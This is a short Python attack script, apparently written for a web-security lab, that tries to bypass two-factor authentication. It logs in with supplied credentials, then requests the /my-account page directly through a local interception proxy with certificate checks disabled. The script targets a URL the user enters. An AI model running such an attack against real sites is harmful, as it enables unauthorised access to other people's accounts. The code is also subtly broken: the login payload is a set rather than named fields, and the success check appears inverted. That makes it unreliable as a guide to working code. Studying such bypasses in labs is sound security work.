import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

session = requests.Session()

def try_logging(url, username, password):
    endpoint = url + "/login"
    print(f'Tentando loggar no endpoint "{endpoint}"...')

    payload = {
        username,
        password
    }

    logging = session.post(endpoint,
                 data=payload,
                 allow_redirects=False,
                 verify=False,
                 proxies=proxies)

    print(logging.status_code)

    print("Tentando 2FA Bypass...")

    endpoint = url + "/my-account"

    _2fa = session.get(endpoint,
                     verify=False,
                     proxies=proxies)

    if("Log out" in _2fa.text):
        print("Bypass falhou no endpoint.")
    else:
        print(f'Bypass foi um sucesso.\nEndpoint: {endpoint}')

url = input("Insira a URL da pagina para o ataque: ")
credentials = input("Insira as credenciais: ").split(":")

try_logging(url, credentials[0], credentials[1])

input("\nPressione ENTER para sair")